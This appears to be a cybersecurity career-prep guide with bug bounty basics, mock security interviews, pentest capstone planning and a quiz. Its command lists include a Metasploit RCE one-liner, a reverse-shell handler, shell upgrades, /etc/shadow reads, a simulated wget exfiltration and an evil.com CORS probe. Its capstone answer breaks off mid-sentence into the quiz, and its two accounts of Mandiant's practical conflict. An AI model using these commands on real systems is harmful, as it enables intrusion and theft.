Intro to Bug Bounty Hunting
HackerOne's $100M Milestone
// core concepts
Responsible Disclosure
Report privately through platform/Hall of Fame before public CVE. 90-day disclosure window is industry standard. Full disclosure = publish without warning, burned bridges.
Bounty Program Triage
Programs sorted by scope, asset type, and payout. Private programs (invite-only) have less competition + higher payouts. Public programs are open to everyone but triage queues are long.
Low-Hanging Vulnerabilities
Missing security headers (HSTS, XFO, CT), exposed .git/config with database creds, CORS misconfigs allowing wildcard Origin — easy finds that consistently pay $50–$500.
Report Writing
Clear steps to reproduce + PoC screenshot makes the difference between a $100 bounty and a $1000 bounty. Severity rating (CVSS), impact description, and remediation suggestion required.
// key commands
curl -I https://target.com
Check response headers for missing security headers — HSTS, X-Frame-Options, X-Content-Type-Options.
curl -v https://target.com/.git/config
Check for exposed .git directory — if 200 OK, you have credentials and source code.
curl -H "Origin: https://evil.com" -H "Referer: https://evil.com" -I https://api.target.com/data
CORS misconfiguration test — look for Access-Control-Allow-Origin: * in response.
curl -s -D - https://target.com | grep -i "Strict-Transport-Security\|X-Frame-Options\|X-Content-Type-Options"
Quick header audit — grep for missing security headers in one command.
nuclei -u https://target.com -t exposures/ -t misconfiguration/ -t headers/
Automated vulnerability scanning with Nuclei templates for exposures, misconfigs, and headers.
cat scope.txt | while read url; do curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "$url"; done
Batch scope check — iterate through target list and return status codes.
// interview answer
Q: How do you approach finding your first bug bounty vulnerability on a new program?
Start with recon — read the program scope carefully, identify what's in and out of scope. Then automate the low-hanging fruit: curl the target for missing security headers, .git/config exposure, CORS wildcard origins. Use Nuclei for template-based scanning. Manual testing comes next — reflected XSS via input fields, IDOR by modifying numeric IDs in URL parameters. Always reproduce cleanly before reporting. A good first find is worth $100–$500 and builds confidence.

Mock Technical Interview — Concepts Round
Google Security Interview Process
// core concepts
STRIDE Threat Model
Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. Microsoft's threat categorization framework — map every vuln to one (or more) STRIDE categories.
Defense in Depth
No single control is trusted. Layered: firewall (L3–4) → WAF (L7) → HIDS → application sandbox → logging. Each layer catches what the previous one misses.
OWASP Top 10
The standard web app vuln awareness list. #1 Broken Access Control, #2 Cryptographic Failures, #3 Injection (SQL, OS, LDAP). Must be able to name at least 5 from memory in an interview.
Incident Response Process
Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned. SANS PICERL framework. Every SOC interview asks this — know it in order.

// interview answer
Q: Walk me through the incident response process using a real scenario.
Using SANS PICERL. Example — NHS WannaCry 2017: Preparation (had AV, no SMBv1 patching procedure), Identification (staff saw ransom screens, IT confirmed lateral movement), Containment (isolated PCs from network, blocked TCP 445 at firewall), Eradication (patched SMBv1, removed worm via safe mode), Recovery (restored from clean backups — systems that had backups recovered in hours), Lessons Learned (automate critical patch deployment, segment network, isolate legacy protocols like SMBv1). Google's security interview stresses applying frameworks to real events, not reciting definitions.

Mock Technical Interview — Practical Round
Mandiant Practical Assessment
// core concepts
Timed Practical Structure
Nmap scan → identify vulnerability → Metasploit exploit → document findings. Time pressure forces prioritization — start with the most likely exploit path, not the most thorough scan.
Wireshark PCAP Analysis
Filter for HTTP/DNS/SMB — identify C2 beaconing (periodic small packets to same IP at regular intervals), exfiltration (large outbound data transfers), and brute-force attempts (many failed auth packets).
Event Log Triage
Linux: /var/log/auth.log and /var/log/syslog. Windows: Event IDs 4625 (failed logon), 4688 (process creation), 7045 (service install). Mandiant expects analysts to triage under 2 hours.
Documentation Under Pressure
Write findings as you go — don't wait until the end. Screenshot every step. Include IPs, ports, commands used, output proof. A tool found data isn't worth points unless documented with context.
// key commands
nmap -sC -sV -oA quick_scan 10.10.10.10
Full service detection + default scripts in one pass — the "time-pressured" scan for practicals.
searchsploit "Apache 2.4.49"
Search Exploit-DB for known CVEs matching detected version — fastest way from scan to exploit.
msfconsole -q -x "use exploit/multi/http/apache_normalized_path_rce;set RHOSTS 10.10.10.10;set RPORT 80;run;exit"
One-liner Metasploit execution — identify vulnerability, weaponize, exploit, all in a single command chain.
tshark -r capture.pcap -Y "dns && !ssdp" -T fields -e dns.qry.name 2>/dev/null | sort -u | head -20
Extract DNS queries from PCAP — identify C2 domains, beaconing patterns, or data exfiltration over DNS.
// interview answer
Q: You have 2 hours to triage a potential breach from a PCAP and system logs. What's your process?
I prioritize. First 15 minutes: run tshark on the PCAP to identify the top talkers by bytes and packets — exfiltration shows as a single IP receiving disproportionate data. Next 15 minutes: check auth.log for failed passwords and unusual timestamps (off-hours login). Then 30 minutes correlation: do the suspicious IPs from PCAP match the logon times? If yes, that's compromise evidence. Last 60 minutes: document everything with screenshots, timeline the intrusion, write the summary. Mandiant's practical tests this exact workflow — they don't want you to find everything, they want you to find the right things in the right order and write it up clearly.

Capstone Project — Plan Your Pentest Report
Capstone Portfolio Impact
// core concepts
Scope & Rules of Engagement
Define target IP range, testing hours, excluded actions (no social engineering, no DoS), and communication protocol. Signed by both parties before any scanning starts. This is the legal barrier.
Pentest Methodology
Reconnaissance (passive → active) → Scanning (port/service → vuln) → Exploitation (initial access → privesc) → Post-Exploitation (pivot → persistence) → Reporting. Every phase documented.
Report Planning
Structure: Executive Summary (non-technical, risk-focused) → Technical Findings (per vuln: screenshot, CVSS, steps to reproduce, remediation) → Appendix (raw scan data, IOCs, timelines). Plan before you execute.
Capstone Value to Employers
60% of hiring managers say a capstone pentest report is more valuable than a cert for entry-level evaluation — it proves applied methodology over theory memorization.
// key commands
echo "Scope: 10.10.10.0/24 | Excluded: Human testing, DoS | Hours: 09:00–17:00 ET" > roe.txt
Create rules of engagement document — defines legal boundaries before any testing begins.
nmap -sn 10.10.10.0/24 -oA live_hosts
Network discovery — identify live targets within the approved scope before port scanning.
mkdir -p {recon,scanning,exploitation,post-exploitation,reporting}
Create directory structure for each pentest phase — organized deliverables = professional output.
touch reporting/{executive_summary.md,technical_findings.md,appendix.md}
Create report skeleton before exploitation — fill in findings as you go, never write report last.
// interview answer
Q: Walk me through how you plan a penetration test from start to finish.
First, scope and ROE: define target IP range, testing hours, and what's off-limits, signed by both sides. No scanning until that's approved. Second, recon: Shodan/DNS for passive, Nmap ping sweep for active discovery. Third, scanning: full port scan on discovered hosts, service version detection, then vulnerability scan with NSE and Nuclei. Fourth, exploitation: prioritize by CVSS — easy wins first (default creds, unpatched known vulns), then manual testing for logic flaws. Fifth, post-exploitation: attempt privesc, enumerate lateral movement paths, but don't actually pivot unless the ROE explicitly allows it. Finally, reporting: executive summary first, then detailed technical findings with screenshots and CVSS scores, remediation steps for each. 60% of hiring managers told a study this is more valuable than a certification for evaluating entry-level candidates.

Capstone Project — Execute & Polish
Sample Pentest Report Structure
// core concepts
Full Pentest Kill Chain
Nmap → vuln scan → get initial shell → privesc to root → maintain access → exfil simulated data → write report. Every step documented with screenshots, commands, and output.
CVSS Scoring
Base Score: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical). Every finding in the report must include CVSS vector string + score. No score = no priority = no action.
Professional Report Structure
Executive Summary (1 page, non-technical), Scope & Methodology, Risk Ratings, Detailed Findings (each with screenshot + CVSS + remediation), Recon Data, Exploit Chains, and Appendix with raw output.
Remediation Guidance
Don't just find problems — fix them. Each finding includes: immediate fix (e.g., "disable SMBv1"), long-term fix (e.g., "implement network segmentation"), and compensating controls (e.g., "block at firewall until patching window").
// key commands
nmap -p- -sV -sC -oA full_scan 10.10.10.10
Full port scan (all 65535 ports) with version detection and scripts — the definitive capstone recon pass.
searchsploit "Linux Kernel 5." | grep -i "privilege\|root\|local" | head -5
Find privilege escalation exploits for the target's kernel version — privesc is the #1 post-exploitation objective.
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.5; set LPORT 4444; run -j"
Start reverse handler in background — catch shells from exploited target for persistent access.
python3 -c "import pty;pty.spawn('/bin/bash')"
Upgrade netcat shell to full interactive TTY — enables tab-completion, job control, and su/sudo.
find / -perm -4000 -type f 2>/dev/null
SUID binary enumeration — the textbook Linux privesc check after gaining initial access.
sudo -l
Check available sudo commands for the current user — NOPASSWD entries are immediate privesc vectors.
cat /etc/shadow 2>/dev/null | head -5 || echo "Cannot read /etc/shadow — need root"
Shadow file attempted read — if it returns hashes, you have root; if it fails, you know the privesc path.
wget -r http://10.10.10.10/
Recursive download — simulated data exfiltration for the "actions on objective" phase of the pentest.

Q: Walk me through a real capstone pentest execution you performed.
Target: VulnHub machine on 10.10.10.10. Phase 1 — Recon: Nmap full port scan revealed Apache 2.4.49 on port 80 and SSH on port 22. Q01
What are three low-hanging vulnerabilities to check first when starting bug bounty recon on a new target?
(1) Missing security headers (HSTS, X-Frame-Options, X-Content-Type-Options) — curl -I to check. (2) Exposed .git/config — curl the path, often reveals credentials. (3) CORS misconfiguration (Access-Control-Allow-Origin: *) — test with a curl Origin header from an attacker domain.
Q02
What five sections should every professional GitHub README in a security portfolio include?
Title/description, tech stack/frameworks used, setup/installation instructions, usage examples with screenshots, project structure overview. Badges (CI status, license) and a "related projects" section are strong bonuses.
Q03
Name six ATS keywords that security applicant tracking systems specifically scan for, and explain what happens if they're missing.
SIEM, Splunk, Wireshark, Nmap, Metasploit, OWASP (also: Python, Bash, Burp Suite, MITRE ATT&CK). Missing them from your resume means the ATS scores you below threshold before a human reads a single word — instant rejection regardless of actual ability.
Q04
LinkedIn reported a specific percentage increase in cybersecurity job postings in 2024. What was it, and what did hiring managers cite as a strong positive signal?
65% increase in cybersecurity job postings. Hiring managers specifically cited a candidate's public "build-in-public" learning portfolio as a strong positive signal — documenting your work consistently is more impressive to recruiters than a static certification.
Q05
What does STRIDE stand for, and how is it used in technical security interviews?
Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. Google's security interview uses STRIDE to evaluate threat modeling — you're expected to map vulnerabilities to STRIDE categories and explain which category each mitigation addresses.
Q06
In Mandiant's practical interview assessment, what three tasks must candidates complete within 2 hours?
(1) Analyze a real malware sample to understand its behavior. (2) Determine C2 infrastructure from PCAP traffic analysis. (3) Write an intrusion analysis report summarizing findings, timeline, and indicators of compromise. Time management and documentation under pressure are the actual skills being tested.
Q07
What is unique about the NSA Cybersecurity Apprenticeship Program, and what does it mean for entry-level candidates?
It hires 100+ entry-level analysts annually with zero professional experience required — a 3-year paid training pipeline. It proves that "3 years experience minimum" is not universal; there are government and defense programs designed to train from scratch if you find the right application path.
Q08
What percentage of hiring managers say a capstone penetration test report is more valuable than a certification for entry-level evaluation?
60%. A full pentest report with executive summary, CVSS-scored findings, screenshots, exploit chains, and remediation proves applied methodology — not just memorized theory. This is why the capstone is the most important deliverable in your entire portfolio.
Q09
What are the five standard sections of a professional penetration test report?
(1) Executive Summary — 1 page, non-technical, risk-focused. (2) Scope & Methodology — what was tested and how. (3) Risk Ratings — findings ranked by CVSS severity. (4) Detailed Findings — each vulnerability with screenshot, CVSS vector, steps to reproduce, and remediation. (5) Appendix — raw scan data, IOCs, timeline.
Q10
What three traits do hiring managers rank as the top indicators of entry-level cybersecurity candidate success?
(1) Sustained dedication — completing a 90-day structured challenge proves you follow through. (2) Technical breadth — you covered foundations through capstone across multiple domains. (3) Documentation discipline — revision files, GitHub repos, pentest reports, and writeups prove you communicate clearly. These three traits consistently outweigh lack of professional experience.
